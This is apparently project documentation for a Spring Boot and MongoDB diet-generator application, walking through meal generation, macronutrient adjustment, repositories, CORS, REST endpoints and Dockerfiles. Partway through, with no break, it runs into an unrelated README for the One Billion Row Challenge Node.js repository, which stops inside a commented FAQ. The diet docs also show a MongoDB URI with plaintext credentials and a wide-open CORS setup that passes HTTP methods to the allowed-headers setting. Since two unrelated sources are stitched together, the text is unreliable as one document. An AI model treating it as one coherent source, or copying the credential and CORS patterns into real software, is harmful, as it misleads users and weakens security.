[//]: # (![DietGeneratorImpl members and constructor Code screenshot]&#40;/screenshots/dietgeneratorfieldconstructor_code_ss.png&#41;)

After the `DietGeneratorImpl` is created, it contains all the necessary information to generate the diet. This includes
a
lists of `Recipe` for each `MealType`, the required `Macronutrient`, the
requested `numberOfMeals`, `baseCaloriesPerMeal`, and a
`Random` object for later usage.

```java

@Override
public Diet generateDiet() {
    Diet diet = new Diet();
    addDishes(diet);
    adjustMacronutrients(diet);
    diet.setShoppingList(ShoppingListGenerator.generateShoppingList(diet));
    return diet;
}
```

[//]: # (![DietGeneratorImpl generate Code screenshot]&#40;/screenshots/dietgeneratorgenerate_code_ss.png&#41;)

There are three main steps in diet creation, `addDishes`, `adjustMacronutrients` and `generateShoppingList`.

The `addDishes` method:

```java
    private void addDishes(Diet diet) {
    addDish(diet, MealType.BREAKFAST);
    for (int i = 1; i < numberOfMeals.doubleValue() - 1; i++) {
        if (i == 3) {
            addDish(diet, MealType.SNACK);
            continue;
        }
        addDish(diet, MealType.LUNCH);
    }
    addDish(diet, MealType.DINNER);
}
```

[//]: # (![DietGeneratorImpl addDishes Code screenshot]&#40;/screenshots/adddishesmethod_code_ss.png&#41;)

The diet plan is populated with specific meal types based on the requested number of meals:

- First Meal: Always Breakfast
- Last Meal: Always Dinner
- Fourth Meal (if applicable): Snack
- Middle Meals: Lunch-type meals

Random `Recipe` is picked from the list of given `MealType` to create a `Dish` and then added to the `Diet` object.
The `Dish` is created
using
static factory method. The nutrients information and required products in grams are calculated from given `Recipe`
and `baseCaloriesPerMeal`.
As `Recipe` holds `Nutrients` information per 100g of the products, `totalCalories` are divided by `baseCaloriesPerMeal`
to create the factor.
This factor is multiplied by each product proportion value to get the actual required grams of the product.

```java
    public static Dish createDish(Recipe recipe, BigDecimal requiredCalories) {
    BigDecimal recipeTotalCalories = recipe.getNutrients().getCalories().getTotalCalories();
    BigDecimal factor = requiredCalories.divide(recipeTotalCalories, 3, RoundingMode.HALF_UP);
    Map<Product, BigDecimal> emptyRecipeToGram = new HashMap<>();
    recipe.getIngredientsProportion().forEach(((product, proportion) -> {
        emptyRecipeToGram.put(product, proportion.multiply(factor));
    }));
    return new Dish(emptyRecipeToGram, recipe);
}
```

[//]: # (![Dish createDish Code screenshot]&#40;/screenshots/dishcreate_code_ss.png&#41;)

It is important to note that immediately after a `Dish` is added to the `Diet`, the macronutrients in
the `Macronutrient`
object are reduced by the total `Nutrients` value of the generated `Dish`. Once all requested dishes are added to
the `Diet`,
the `Macronutrient` object retains its `calories` field as 10% of the total requested calories, which is our reserved
calories value. The remaining fields — `proteins`, `fats`, and `carbohydrates` — are incorrect.

`Recipe` objects have strictly defined percentage ratios of `Product`, making it impossible to create a perfectly
macronutrient-balanced diet plan with randomly chosen recipes. While we can control the calories, the
specific macronutrient values must be adjusted accordingly.

The `adjustMacronutrients` method:

```java
   private void adjustMacronutrients(Diet diet) {
    int numberOfLoops = 3;
    for (int i = 0; i < numberOfLoops; i++) {
        if (missingMacronutrients.getCarbohydrates().doubleValue() < 0)
            diet.reduceMacronutrient(Filler.CARBOHYDRATE, missingMacronutrients.getCarbohydrates().abs(), missingMacronutrients);
        else
            diet.increaseMacronutrient(Filler.CARBOHYDRATE, missingMacronutrients.getCarbohydrates(), missingMacronutrients);

        if (missingMacronutrients.getFats().doubleValue() < 0)
            diet.reduceMacronutrient(Filler.FAT, missingMacronutrients.getFats().abs(), missingMacronutrients);
        else
            diet.increaseMacronutrient(Filler.FAT, missingMacronutrients.getFats(), missingMacronutrients);

        if (missingMacronutrients.getProteins().doubleValue() < 0)
            diet.reduceMacronutrient(Filler.PROTEIN, missingMacronutrients.getProteins().abs(), missingMacronutrients);
        else
            diet.increaseMacronutrient(Filler.PROTEIN, missingMacronutrients.getProteins(), missingMacronutrients);
    }
}
```

[//]: # (![DietGenerator adjustMacronutrient Code screenshot]&#40;/screenshots/adjustmacronutrient_code_ss.png&#41;)

This method check `Macronutrient`'s `carbohydrates`, `fats` and `proteins` fields. If the value is negative it means
there
is too much of the given macronutrient in the diet, if the value is positive it means there are missing macronutrient in
the diet and respectively `reduceMacronutrient` and `increaseMacronutrient` method are called on `Diet` object using
those offsets. Target
is to bring those values as close to 0 as possible.

As you can see on the screen, this operation is performed 3 times. It has to be done to generate diet accurately.
Each of missing macronutrients is adjusted separately, once we set our carbohydrates then during fats adjustment we may
break carbohydrates amount in the diet. Let's assume that we want to add 20g proteins to the diet, algorithm look for
all `Product` marked with `Filler.PROTEIN` and add calculated amount of those products to satisfy missing 20g of
proteins. Unfortunately, very likely this method is going to add also some carbohydrates and fats with those products.

Every iteration required macronutrients that need to be adjusted are closer to the 0 and three iterations is sufficient.

```java
    public void reduceValues(Nutrients nutrients) {
    setCalories(calories.subtract(nutrients.getCalories().getTotalCalories()));
    setProteins(proteins.subtract(nutrients.getProteins().getTotalProteins()));
    setFats(fats.subtract(nutrients.getFats().getTotalFats()));
    setCarbohydrates(carbohydrates.subtract(nutrients.getCarbohydrates().getTotalCarbohydrates()));
}

public void increaseValues(Nutrients nutrients) {
    setCalories(calories.add(nutrients.getCalories().getTotalCalories()));
    setProteins(proteins.add(nutrients.getProteins().getTotalProteins()));
    setFats(fats.add(nutrients.getFats().getTotalFats()));
    setCarbohydrates(carbohydrates.add(nutrients.getCarbohydrates().getTotalCarbohydrates()));
}
```

[//]: # (![Diet increase macro Code screenshot]&#40;/screenshots/increasemacro_code_ss.png&#41;)

Those method first look for `Dish` in the `Diet` object that can be scaled with the given `Filler`. Then the amount of
requested grams are distributed uniformly across the all suitable dishes and `Product`s in those `Dish`es by
calling `increaseFiller` or `reduceFiller`
methods.

Mentioned methods perform similar operation, but they iterate over `Product` list in the `Dish` and also updates
its own `Nutrients` to correct the changes.
The difference in `Nutrients` is returned and subtracted or added from `Macronutrient` object.

The `increaseFiller` method:

```java
public Nutrients increaseFiller(Filler filler, BigDecimal grams) {
    Nutrients totalAddedNutrients = Nutrients.createEmptyNutrients();
    if (grams == null || filler == null || filler == Filler.NONE || grams.doubleValue() <= 0) {
        return totalAddedNutrients;
    }

    Integer fillerPopulation = numberOfFillers.get(filler);
    if (fillerPopulation == null) return totalAddedNutrients;

    BigDecimal numberOfProductFillers = BigDecimal.valueOf(fillerPopulation);
    if (recipe.isScalable() && numberOfProductFillers.doubleValue() > 0) {
        BigDecimal gramsFraction = grams.divide(numberOfProductFillers, 2, RoundingMode.HALF_DOWN);
        productToGrams.forEach(((product, bigDecimal) -> {
            if (product.getFiller().equals(filler)) {
                BigDecimal currentGrams = productToGrams.get(product);
                BigDecimal productGramsToAdd = product.calculateProductGramsForRequiredFiller(filler, gramsFraction);
                productToGrams.put(product, currentGrams.add(productGramsToAdd));
                Nutrients subtractedNutrients = product.calculateNutrients(productGramsToAdd);
                nutrients.addNutrients(subtractedNutrients);
                totalAddedNutrients.addNutrients(subtractedNutrients);
            }
        }));
    }
    return totalAddedNutrients;
}
```

[//]: # (![Dish increaseFiller Code screenshot]&#40;/screenshots/increasefiller_code_ss.png&#41;)

The `reduceFiller` method:

```java
public Nutrients reduceFiller(Filler filler, BigDecimal grams) {
    Nutrients totalReducedNutrients = Nutrients.createEmptyNutrients();
    if (grams == null || filler == null || grams.doubleValue() <= 0 || filler == Filler.NONE) {
        return totalReducedNutrients;
    }

    Integer fillerPopulation = numberOfFillers.get(filler);
    if (fillerPopulation == null) return totalReducedNutrients;

    BigDecimal numberOfProductFillers = BigDecimal.valueOf(fillerPopulation);
    if (recipe.isScalable() && numberOfProductFillers.doubleValue() > 0) {
        BigDecimal gramsFraction = grams.divide(numberOfProductFillers, 2, RoundingMode.HALF_DOWN);

        Map<Product, BigDecimal> fillersToGrams = productToGrams.entrySet().stream()
                .filter(entry -> entry.getKey().getFiller().equals(filler))
                .collect(Collectors.toMap(
                        Map.Entry::getKey,
                        Map.Entry::getValue));

        fillersToGrams.forEach(((product, currentGrams) -> {
            BigDecimal productGramsToRemove = product.calculateProductGramsForRequiredFiller(filler, gramsFraction);
            if (currentGrams.subtract(productGramsToRemove).doubleValue() > 0) {
                productToGrams.put(product, currentGrams.subtract(productGramsToRemove));
                Nutrients subtractedNutrients = product.calculateNutrients(productGramsToRemove);
                nutrients.subtractNutrients(subtractedNutrients);
                totalReducedNutrients.addNutrients(subtractedNutrients);
            }
        }));
    }
    return totalReducedNutrients;
}
```

[//]: # (![Dish reduceFiller Code screenshot]&#40;/screenshots/reducefiller_code_ss.png&#41;)

### 3.4.2 ShoppingListGenerator

The `ShoppingListGenerator` is a simple interface with one default method that generates a `Map<String, Double>` of
product names to values
in grams for the entire diet. It requires only one parameter, which is `Diet`.

```java
public interface ShoppingListGenerator {

    static Map<String, Double> generateShoppingList(Diet diet) {
        Map<String, Double> shoppingList = new HashMap<>();

        diet.getDishes().forEach((dish -> {
            dish.getProductToGrams().forEach((product, grams) -> {
                Double currentValue = shoppingList.get(product.getName());
                double valueToAdd = grams.setScale(1, RoundingMode.HALF_UP).doubleValue();
                if (currentValue != null) {
                    valueToAdd += currentValue;
                }
                shoppingList.put(product.getName(), valueToAdd);
            });
        }));
        return shoppingList;
    }
}
```

[//]: # (![ShoppingListGenerator Code screenshot]&#40;/screenshots/shoppinglistgenerator_code_ss.png&#41;)

# 4. Application

The application layer contains actual business logic and usage of domain layer. It orchestrates use cases, and indicate
interfaces that need to be implemented to provide correct functionality of the application. It is important to note
here, that
this layer, same as domain layer, is free from frameworks and libraries.

## 4.1 Repositories

The application require access to database to obtain information about recipes and products. Those database usage is
dictated by interfaces exposed in this layer. As application layer is not depended on actual infrastructure layer, it
doesn't care about what kind of database will provide that information. The only requirement is that those interfaces
need to be implemented correctly in infrastructure layer.

The `ProductRepository`:

```java
public interface ProductRepository {

    Product save(Product product);

    Product getProduct(String productName);

    Product getProduct(UUID uuid);

}
```

The `RecipeRepository` :

```java
public interface RecipeRepository {

    Recipe save(Recipe recipe);

    List<Recipe> findAllByDietAndMealTypes(DietType dietType, MealType mealType);

    List<Recipe> findByName(String name);

}
```

## 4.2 Use Cases

The use cases are actual usage of domain layer, should contain only one concrete business usage of application. From
code perspective, it has to have only one public method, but can have unlimited private methods.

To keep this layer free from framework and libraries, those use cases need to be registered in `BeanConfiguration` class
in infrastructure layer.
That allows them to be injected in presentation layer in controllers. See infrastructure layer documentation to discover
details.

The implementation of `CalculateBMIUseCase` and `CalculateTDEEUseCase` is quite simple and straightforward and consist
of actual calculator method call.

The `CalculateDietUseCase` is interesting use case. This class need to actually use the logic created in domain layer.
It is next layer of abstraction, none of low level implementation is presented here. Only actual usage.

```java

@Override
public Diet createDiet(DietAttributes dietAttributes) {

    Macronutrient macronutrient = calculateMacronutrients(dietAttributes);
    Map<MealType, List<Recipe>> allRecipes = getAllSegregatedRecipes(dietAttributes.dietType());

    DietGenerator dietGeneratorImpl = new DietGeneratorImpl(
            dietAttributes.numberOfMeals(),
            macronutrient,
            allRecipes);

    return dietGeneratorImpl.generateDiet();
}
```

First `Macronutrient` is calculated using private method where `MacroCalculator` is created
using `MacroCalculatorFactory`.

```java
private Macronutrient calculateMacronutrients(DietAttributes dietAttributes) {
    MacroCalculator macroCalculator = MacroCalculatorFactory.getMacroCalculator(dietAttributes.dietType());
    MacroCalculatorAttributes macroCalculatorAttributes = new MacroCalculatorAttributes(
            dietAttributes.requiredCalories(),
            dietAttributes.bodyWeightInKg(),
            dietAttributes.gender());
    return macroCalculator.calculate(macroCalculatorAttributes);
}
```

Next, the list of `Recipes` is fetched from the database and segregated by the `MealType` and stored in the `Map`.
Once all data is gathered to perform diet generation, the `DietGeneratorImpl` object is created and method generateDiet
is used to create `Diet`.
Rest logic happened in the generator class itself and ready object is returned to the presentation layer where is mapped
to the `Response` and returned to the user.

# 5. Infrastructure

---


In the infrastructure layer, we find all configurations, external API integrations, and persistence connections. This
application currently uses the Spring Boot 3 framework, so all configurations related to Spring will be kept in this
layer. In addition to the framework, the application utilizes a MongoDB database and the CalorieNinjas external API to
populate Products.

## 5.1 Spring Boot configuration

### 5.1.1 Bean Configuration

The application uses a clean architecture approach, meaning that the domain and application layers must be kept separate
from framework dependencies. As mentioned in the architecture documentation, there is a specific way to achieve this. We
need to register `UseCases` classes from the application layer with `@Bean` in the `@Configuration` layer. This allows
us to
inject these classes into other components within the application while keeping domain and application layers framework
free.

Since the application is relatively small, the configuration file is also small.

Here is a sample `@Bean` registration method:

```java

@Configuration
public class BeanConfiguration {

    @Bean
    public CreateDiet dietService(RecipeRepository recipeRepository) {
        return new CreateDietUseCase(recipeRepository);
    }
}
```

[//]: # (![Bean registration screenshot]&#40;/screenshots/bean_registration_ss.png&#41;)

### 5.1.2 Cors Configuration

Cross-Origin Resource Sharing (CORS) is a security feature implemented by web browsers that allows or restricts web
pages from making requests to a different domain than the one that served the web page. This is done to prevent
potentially malicious websites from accessing sensitive data on other sites without the user's knowledge.

To allows users utilize this application from the browser, cors configuration need to be implemented.
The application has presentation Single-Page Application and endpoints are exposed by Spring MVC, the basic config is
provided. It is highly
recommended to
adjust these settings for your needs.

```java

@Configuration
public class CorsConfiguration {

    @Bean
    public WebMvcConfigurer corsConfigurer() {
        return new WebMvcConfigurer() {
            @Override
            public void addCorsMappings(CorsRegistry registry) {
                registry.addMapping(""/api/**"")
                        .allowedHeaders(""GET"", ""POST"")
                        .allowedOrigins(""*"")
                        .allowedHeaders(""*"");
            }
        };
    }

}
```

[//]: # (![CORS config screenshot]&#40;/screenshots/cors_config_ss.png&#41;)

### 5.1.3 Error Handling

When ever error is thrown in the application, we can catch it and return custom response to the user.
To achieve this, application utilize `@ControllerAdvice` component and register errors to be handled in this class. In
all cases `ExceptionResponse` dto is returned to the user with message, date and description. See presentation layer for
details about dto.

```java

@ControllerAdvice
public class GlobalExceptionHandler extends ResponseEntityExceptionHandler {

    @ExceptionHandler(ResourceNotFoundException.class)
    public ResponseEntity<ExceptionResponse> handleIllegalArgumentException(
            ResourceNotFoundException exception, WebRequest webRequest) {

        ExceptionResponse errorDto = new ExceptionResponse(
                exception.getMessage(),
                new Date(),
                webRequest.getDescription(false));

        return new ResponseEntity<>(errorDto, HttpStatus.NOT_FOUND);
    }
}
```

[//]: # (![GlobalExceptionHandler config screenshot]&#40;/screenshots/global_exception_handler_ss.png&#41;)

## 5.2 Calories Ninjas

This application leverages the CalorieNinjas external API to gather information about `Products`. CalorieNinjas offers a
straightforward registration process and user-friendly endpoints. The free tier allows for up to 10,000 requests per
month.

During application startup, the database is populated using data from CalorieNinjas. If a product is already present in
the database, the API call is skipped to optimize performance and reduce unnecessary requests.

The `Products` to fetch are indicated in the `recipe.txt` list in the resources' folder. The `RecipeInit` class is the
parser for that list, and it uses `NinjaService` where `NinjaApi` class is injected.
Special format need to be kept if you decide to extend that list.

![Recipe List screenshot](/screenshots/recipe_list_ss.png)

First line `*` indicate the beginning of the list, followed by properties always in the same order, each properties need
to contain `:` and no space:

- Name (name of your recipe)
- HowTo (preparation steps)
- DietType (High Protein (the only supported diet right now))
- MealType (it can be list, each element separated by `/` sign. See domain layer for available meals)
- Scalable (true or false)

After properties list of products need to appear each in separate line enclosed by `**` from top and bottom line.
The format is as follows:

`name:grams/Filler`

The `name` in this format will be requested by the api. For `Filler` see the domain layer documentation. The `grams`
properties need to be given as integer.

The last line `***` indicate end of the recipe to parse.

The `NinjaApi` will fetch data using `RestClient`, provided by the Spring dependency library, from the CaloriesNinja api
and generate `NinjaReponse` that holds the list of `NinjaItems`.
First `NinjaItem` found in `NinjaResponse` will be mapped to the `Product` and saved to the database
using `ProductService`.

## 5.3 Persistence

This application utilize MongoDB which is easy to use NoSQL database. As Clean Architecture is used in this project,
each `@Document` has special implementation flow. Database connection configuration is very simple, it consists of one
line located in
`application.properties` file and `MongoDBConfiguration` class where packages is specified to scan. 

``` application.properties
spring.data.mongodb.uri=mongodb://fatatu:fatatu@mongo:27017/diet-generator?authSource=admin
```

```java
@Configuration
@EnableMongoRepositories(basePackages = ""org.ectimel.dietgenerator.infrastructure.persistance.mongo.repositories"")
public class MongoDBConfiguration {
}
```


Note that Docker Compose is used in this project, which means the uri address is service name
from `docker-compose.yaml`.

### 5.3.1 Documents

Currently, application has 2 main documents `ProductDocument` and `RecipeDocument`. I decided to use `UUID` as id in
each
document in this application. To achieve that, special abstract class `MongoUUIDEntity` that holds id as `UUID` type was
created.
It also contains setter method that is used during serialization if id is not presented.

```java

@Getter
@SuperBuilder
@NoArgsConstructor
public abstract class MongoUUIDEntity {

    @Id
    protected UUID id;

    public void setId(UUID id) {
        if (this.id != null) throw new UnsupportedOperationException(""ID is already defined"");

        this.id = id;
    }
}
```

[//]: # (![MongoUUID screenshot]&#40;/screenshots/mogouuid_ss.png&#41;)

Each actual document need to extend that class to provide `UUID` as ID. Special `@Component` is created that listen
for `BeforeConvertEvent` and will assign the UUID.

```java

@Component
public class UuidEntityEventListener extends AbstractMongoEventListener<MongoUUIDEntity> {

    @Override
    public void onBeforeConvert(BeforeConvertEvent<MongoUUIDEntity> event) {
        super.onBeforeConvert(event);
        MongoUUIDEntity mongoUUIDEntity = event.getSource();

        if (mongoUUIDEntity.getId() == null) {
            mongoUUIDEntity.setId(UUID.randomUUID());
        }
    }

}
```

[//]: # (![Before Convert Event screenshot]&#40;/screenshots/beforeConvert_event_ss.png&#41;)

### 5.3.2 Mappers

Each document need to have its own mapper that will map `@Document` to domain object and from domain to `@Document`.
This step is mandatory to separate domain and infrastructure layers. `DomainMapper` generic interface is created to be
implemented by actual mappers. Some inner classes that are used to represent data but are not actual `@Documents` also
needs mappers. For example `NutrientInformation` class.

```java
public interface DomainMapper<D, E> {
    D mapToDomain(E entityObject);

    E mapFromDomain(D domainObject);
}
```

[//]: # (![Domain Mapper screenshot]&#40;/screenshots/domain_mapper_ss.png&#41;)

### 5.3.3 Repositories

As mentioned before, the domain layer expose interfaces that need to be implemented to provide reading from and writing
to database.
Those repositories classes are prefixed with `Mongo` and suffixed with `Impl` and those classes are injected into
the `UseCases` that are registered by `BeanConfiguration` class.

To utilize SpringJDBC we need to perform additional step. For each `@Document` we need to create the interface that will
extend
`MongoRepository<T, ID>` interface. This repository extend `CrudRepository` and is adjusted to handle custom
mongo `@Query`. Those interfaces always have prefix `SpringDataMongo`

```java
public interface SpringDataMongoProductRepository extends MongoRepository<ProductDocument, UUID> {

    @Query(""{ 'name' : ?0 }"")
    Optional<ProductDocument> findByName(String name);

}
```

[//]: # (![Spring Data Repo screenshot]&#40;/screenshots/spring_data_repo_ss.png&#41;)

Once we have our interfaces we inject them in to the classes that implement exposed by domain layer interfaces to
actually perform writing to and reading from database.

```java

@Repository
@Qualifier(""mongoProductRepository"")
public class MongoProductRepositoryImpl implements ProductRepository {

    private final SpringDataMongoProductRepository productRepository;
    private final ProductMapper productMapper;

    public MongoProductRepositoryImpl(SpringDataMongoProductRepository productRepository, ProductMapper productMapper) {
        this.productRepository = productRepository;
        this.productMapper = productMapper;
    }

    @Override
    public Product save(Product product) {
        ProductDocument savedProduct = productRepository.save(productMapper.mapFromDomain(product));
        return productMapper.mapToDomain(savedProduct);
    }
}
```

[//]: # (![Mongo Impl Repo screenshot]&#40;/screenshots/mongo_impl_ss.png&#41;)

This way we keep our domain layer free from frameworks. To look at it from another angle see the diagram below.

![Repositories UML screenshot](/screenshots/repositories_uml.png)

# 6. Presentation

---

The presentation layer is responsible for handling user interface logic. It interacts with the user, displaying data and
capturing user input, and then communicates this data to the underlying application layers without containing any
business logic itself.

Currently, the application expose rest controllers to the user that can be used to perform some operations. Those
controllers are:
`CalculatorController`, `DietController`, `ProductController`, `RecipeController`. All controllers paths are prefixed
with
`/api/v1/` to indicate usage of api and the version.

For details please visit the [SWAGGER](link) documentation.

Each endpoint has its own response object, suffixed with `Response`. If endpoint is of type `POST` and
require `@RequestBody` object, it has dto object suffixed with `Request`. Every other dto object (inner objects) are
suffixed with `Dto`.

DTOs objects are used to transfer data to the user, we would like to avoid responds with domain objects. To achieve
these,
mappers classes ware created. Some, complex `Request` objects has built method mapToDomain() to simplify complexity.

```java
public DietAttributes mapToDomain() {
    return new DietAttributes(
            BigDecimal.valueOf(this.kcal()),
            DietType.fromValue(this.dietType()),
            BigDecimal.valueOf(this.numberOfMeals()),
            BigDecimal.valueOf(this.bodyWeightInKg()),
            Gender.stringToGender(this.gender()));
}
```

## 6.1 Controllers endpoints:

Most important is `DietController`, it expose one endpoint for diet generation:

`/api/v1/` with `POST` method.

```java

@PostMapping
public ResponseEntity<DietResponse> generateDiet(@Valid @RequestBody DietRequest dietRequest) {
    Diet diet = createDiet.createDiet(dietRequest.mapToDomain());
    return ResponseEntity.ok(dietMapper.mapToDietResponse(diet));
}
```

This endpoint require validated `DietRequest` dto and simple implementation in json format is presented below.

```json
{
  ""kcal"": ""3000"",
  ""dietType"": ""High Protein"",
  ""numberOfMeals"": ""5"",
  ""bodyWeightInKg"": 100,
  ""gender"": ""MALE""
}
```

It returns `DietResponse` object:

```java
public record DietResponse(List<DishDto> dishes, NutrientDto nutrition, Map<String, Double> shoppingList) {
}
```

The `CalculatorController` provide 2 endpoints.

`/api/v1/tdee` with `POST` method

```java

@PostMapping(""/tdee"")
public ResponseEntity<TDEEResponse> calculateTDEE(@RequestBody TDEERequest TDEERequest) {
    Double TDEE = TDEECalculator.calculateTDEE(TDEERequest.mapToDomain()).doubleValue();
    return ResponseEntity.ok(new TDEEResponse(TDEE + ""kcal""));
}
```

This endpoint require validated `TDEERequest` dto and simple implementation in json format is presented below.

```json
{
  ""bodyWeightInKg"": 120,
  ""heightInCm"": 174,
  ""age"": 30,
  ""gender"": ""maasdlae"",
  ""activityLevel"": ""MODERATELY""
}
```

`/api/v1/bmi` with `POST` method

```java

@PostMapping(""/bmi"")
public ResponseEntity<BMIResponse> calculateBMI(@RequestBody BMIRequest BMIRequest) {
    Double result = calculateBMI.calculate(
                    BigDecimal.valueOf(BMIRequest.bodyWeightInKg()),
                    BigDecimal.valueOf(BMIRequest.heightInCm()))
            .doubleValue();

    return ResponseEntity.ok(new BMIResponse(result));
}
```

This endpoint require validated `BMIRequest` dto and simple implementation in json format is presented below.

```json
{
  ""bodyWeightInKg"": 120,
  ""heightInCm"": 174
}
```

The `RecipeController` expose endpoint to fetch information about recipes.

`/api/v1/{recipeName}` with `GET` method and require path variable.

```java

@GetMapping(""/{recipeName}"")
public ResponseEntity<RecipeResponse> getProductByName(@PathVariable String recipeName) {
    List<Recipe> recipeList = recipeService.getRecipe(recipeName);
    List<RecipeDto> recipeDto = recipeList
            .stream()
            .map(recipeDtoMapper::mapFromDomain)
            .toList();
    return ResponseEntity.ok(new RecipeResponse(recipeDto));
}
```

The `ProductController` expose endpoint to fetch information about products.

`/api/v1/{productName}` with `GET` method and require path variable.

```java

@GetMapping(""/{productName}"")
public ResponseEntity<ProductResponse> getProductByName(@PathVariable String productName) {
    Product product = productService.getProduct(productName);
    ProductDto productDto = productDtoMapper.mapFromDomain(product);
    return ResponseEntity.ok(new ProductResponse(List.of(productDto)));
}
```

# 7. Docker

---

The application uses Docker and Docker Compose to simplyfy deployment and configuration on other machines.
The `docker-compose.yaml` consist of 4 services - mongo, mongo-express, spring-boot-app, and react-vite.
First two are database related services where mongo-express allows us to explore database using graphical user
interface.

Dockerfile for react application:

```dockerfile
FROM node:18.20.2-alpine

WORKDIR /app

COPY package.json .

RUN npm install -g npm@10.5.1
RUN npm install -g typescript
RUN npm install

COPY . .

RUN npm run build

EXPOSE 5173

CMD [ ""npm"", ""run"", ""preview"" ]
```

Dockerfile for Spring Boot app, note that it use multistage approach. First jar file is built, and secondly application
is started from that jar file.

```dockerfile
FROM maven:3.9 as BUILD
WORKDIR /app
COPY pom.xml /app
RUN mvn dependency:resolve
COPY . /app
RUN mvn clean
RUN mvn package -DskipTests -X

FROM amazoncorretto:21
COPY --from=BUILD /app/target/*.jar app.jar
EXPOSE 8080
CMD [""java"", ""-jar"", ""app.jar""]
```

1brc/nodejs,main,"# 1️⃣🐝🏎️ The One Billion Row Challenge with Node.js

## About the Challenge

The One Billion Row Challenge (1BRC) is a fun exploration of how far modern Java can be pushed for aggregating one billion rows from a text file.

Later the community created a dedicated @1brc organization to pay more attention to the implementations in other languages. This repository contains and accepts Node.js based implementations.

Grab all your (virtual) threads, reach out to SIMD, optimize your GC, or pull any other trick, and create the fastest implementation for solving this task!

<img src=""1brc.png"" alt=""1BRC"" style=""display: block; margin-left: auto; margin-right: auto; margin-bottom:1em; width: 50%;"">

The text file contains temperature values for a range of weather stations.
Each row is one measurement in the format `<string: station name>;<double: measurement>`, with the measurement value having exactly one fractional digit.
The following shows ten rows as an example:

```
Hamburg;12.0
Bulawayo;8.9
Palembang;38.8
St. John's;15.2
Cracow;12.6
Bridgetown;26.9
Istanbul;6.2
Roseau;34.4
Conakry;31.2
Istanbul;23.0
```

The task is to write a program which reads the file, calculates the min, mean, and max temperature value per weather station, and emits the results on stdout like this
(i.e. sorted alphabetically by station name, and the result values per station in the format `<min>/<mean>/<max>`, rounded to one fractional digit):

```
{Abha=-23.0/18.0/59.2, Abidjan=-16.2/26.0/67.3, Abéché=-10.0/29.4/69.0, Accra=-10.1/26.4/66.4, Addis Ababa=-23.7/16.0/67.0, Adelaide=-27.8/17.3/58.5, ...}
```

See [below](#entering-the-challenge) for instructions how to enter the challenge with your own implementation.

## Prerequisites

1. [Java 21](https://openjdk.org/projects/jdk/21/) to generate the `measurements.txt` files and optionally run tests.
2. Node.js, preferably via nvm (node version manager) must be installed on your system.

## Running the Challenge

This repository contains two programs:

- `dev.morling.onebrc.CreateMeasurements` (invoked via _create_measurements.sh_): Creates the file _measurements.txt_ in the root directory of this project with a configurable number of random measurement values
- `src/main/nodejs/baseline/index.js` (invoked via _calculate_average_baseline.sh_): Calculates the average values for the file _measurements.txt_

Execute the following steps to run the challenge:

1. Build the project using Apache Maven:

   ```
   ./mvnw clean verify
   ```

2. Create the measurements file with 1B rows (just once):

   ```
   ./create_measurements.sh 1000000000
   ```

   This will take a few minutes.
   **Attention:** the generated file has a size of approx. **12 GB**, so make sure to have enough diskspace.

3. Calculate the average measurement values:

   ```
   ./calculate_average_baseline.sh
   ```

   The provided naive example implementation uses the Node.js Streams for processing the file and completes the task in ~6m16s on environment used for [result evaluation](#evaluating-results).
   It serves as the base line for comparing your own implementation.

4. Optimize the heck out of it:

   Adjust the `src/main/nodejs/baseline/index.js` program to speed it up, in any way you see fit (just sticking to a few rules described below).
   Options include parallelizing the computation, memory-mapping different sections of the file concurrently, choosing and tuning the garbage collector, and much more.

## Flamegraph/Profiling

> TODO: add instructions on how to profile node.js programs

## Rules and limits

- No external library dependencies may be used
<!-- - Implementations must be provided as a single source file -->
- The computation must happen at application _runtime_, i.e. you cannot process the measurements file at _build time_
  and just bake the result into the binary
- Input value ranges are as follows:
  - Station name: non null UTF-8 string of min length 1 character and max length 100 bytes (i.e. this could be 100 one-byte characters, or 50 two-byte characters, etc.)
  - Temperature value: non null double between -99.9 (inclusive) and 99.9 (inclusive), always with one fractional digit
- There is a maximum of 10,000 unique station names
- Implementations must not rely on specifics of a given data set, e.g. any valid station name as per the constraints above and any data distribution (number of measurements per station) must be supported

## Entering the Challenge

To submit your own implementation to 1BRC, follow these steps:

- Create a fork of the [1brc/nodejs](https://github.com/1brc/nodejs/) GitHub repository.
- Create a copy of `src/main/nodejs/baseline` directory, rename it to `src/main/nodejs/<your_GH_user>`, e.g. `src/main/nodejs/JohnDoe`.
- Make that implementation fast. Really fast.
- Create a copy of _calculate_average_baseline.sh_, named _calculate_average\_<your_GH_user>.sh_, e.g. _calculate_average_JohnDoe.sh_.
- Adjust that script so that it references your implementation file. If needed, provide any Node.js/V8 runtime arguments.
  Make sure that script does not write anything to standard output other than calculation results.
- Run the test suite by executing _/test.sh <your_GH_user>_; if any differences are reported, fix them before submitting your implementation.
- Create a pull request against the upstream repository, clearly stating
  - The execution time of the program on your system and specs of the same (CPU, number of cores, RAM). This is for informative purposes only, the official runtime will be determined as described below.
- I will run the program and determine its performance as described in the next section, and enter the result to the scoreboard.

**Note:** I reserve the right to not evaluate specific submissions if I feel doubtful about the implementation (I.e. I won't run your Bitcoin miner ;).

<!-- If you'd like to discuss any potential ideas for implementing 1BRC with the community,
you can use the [GitHub Discussions](https://github.com/gunnarmorling/onebrc/discussions) of this repository.
Please keep it friendly and civil. -->

## Evaluating Results

For now results are determined by running the program on a Apple MacBook M1 32GB (10 physical).
The `time` program is used for measuring execution times, i.e. end-to-end times are measured.
Each contender will be run five times in a row.
The slowest and the fastest runs are discarded.
The mean value of the remaining three runs is the result for that contender and will be added to the results table above.
The exact same _measurements.txt_ file is used for evaluating all contenders.

<!-- If you'd like to spin up your own box for testing on Hetzner Cloud, you may find these [set-up scripts](https://github.com/gunnarmorling/cloud-boxes/) (based on Terraform and Ansible) useful.
It has been reported that instances of the CCX33 machine class can significantly vary in terms of performance,
so results are only comparable when obtained from one and the same instance.
Note this will incur cost you are responsible for, I am not going to pay your cloud bill :) -->

<!-- ## Prize

If you enter this challenge, you may learn something new, get to inspire others, and take pride in seeing your name listed in the scoreboard above.
Rumor has it that the winner may receive a unique 1️⃣🐝🏎️ t-shirt, too! -->

## FAQ

<!-- _Q: Can I use Kotlin or other JVM languages other than Java?_\
A: No, this challenge is focussed on Java only. Feel free to inofficially share implementations significantly outperforming any listed results, though.

_Q: Can I use non-JVM languages and/or tools?_\
A: No, this challenge is focussed on Java only. Feel free to inofficially share interesting implementations and results though. For instance it would be interesting to see how DuckDB fares with this task.

_Q: I've got an implementation—but it's not in Java. Can I share it somewhere?_\
